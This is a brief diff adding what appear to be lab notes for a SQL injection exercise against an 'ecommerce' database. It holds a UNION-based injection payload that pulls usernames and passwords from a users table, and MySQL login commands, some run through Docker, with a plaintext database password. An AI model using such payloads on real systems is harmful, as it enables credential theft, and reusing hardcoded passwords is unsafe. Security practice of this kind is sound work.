@@ -1,0 +1,11 @@
+' UNION SELECT 1, username, password, 9.99 FROM users -- 
+
+
+mysql -u dbuser -pcinvestav123 ecommerce
+
+o
+
+docker exec -it db-server mysql -u dbuser -pcinvestav123 ecommerce
+
+SELECT * FROM users;
+
